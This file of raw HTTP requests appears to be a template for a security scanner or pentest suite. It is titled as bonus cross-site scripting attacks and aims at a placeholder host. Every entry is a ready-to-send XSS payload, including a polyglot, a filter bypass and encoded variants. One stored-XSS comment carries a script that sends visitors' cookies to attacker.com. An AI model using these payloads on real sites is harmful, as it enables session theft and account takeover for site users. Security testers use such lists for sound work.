# XSS (Cross-Site Scripting) - Bonus attacks
# Complément aux injections

### Reflected XSS - Basic
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: {{host}}

### Reflected XSS - Event Handler
GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1
Host: {{host}}

### Reflected XSS - JavaScript Protocol
GET /search?q=<a href="javascript:alert(1)">Click</a> HTTP/1.1
Host: {{host}}

### Stored XSS - Comment
POST /api/comments HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 80

{"comment": "<script>fetch('http://attacker.com?c='+document.cookie)</script>"}

### DOM XSS - Hash Fragment
GET /#<img src=x onerror=alert(1)> HTTP/1.1
Host: {{host}}

### XSS - SVG
GET /search?q=<svg/onload=alert(1)> HTTP/1.1
Host: {{host}}

### XSS - Polyglot
GET /search?q=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e HTTP/1.1
Host: {{host}}

### XSS - Filter Bypass
GET /search?q=<scr<script>ipt>alert(1)</scr</script>ipt> HTTP/1.1
Host: {{host}}

### XSS - Encoded
GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Host: {{host}}

### XSS - Double Encoded
GET /search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E HTTP/1.1
Host: {{host}}
